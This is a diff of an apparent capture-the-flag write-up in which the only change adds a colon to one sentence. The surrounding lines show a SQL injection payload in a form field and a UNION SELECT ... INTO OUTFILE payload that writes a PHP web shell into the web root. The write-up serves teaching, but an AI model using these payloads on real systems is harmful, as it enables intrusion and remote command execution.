@@ -134,7 +134,7 @@ username=Tanades&country=Brazil'+UNION+SELECT+database()+--+//
 <br />
 <br />
 
-Even though this seems like the way to enumerate credentials and escalate privileges, this is not the case, we have to create a **webshell** using an ***INTO OUTFILE*** clause
+Even though this seems like the way to enumerate credentials and escalate privileges, this is not the case, we have to create a **webshell** using an ***INTO OUTFILE*** clause:
 ```HTTP
 username=Tanades&country=Brazil'+UNION+SELECT+"<%3fphp+system($_GET['cmd'])%3b%3f>"+INTO+OUTFILE+"/var/www/html/webshell.php"+--+//
 ```
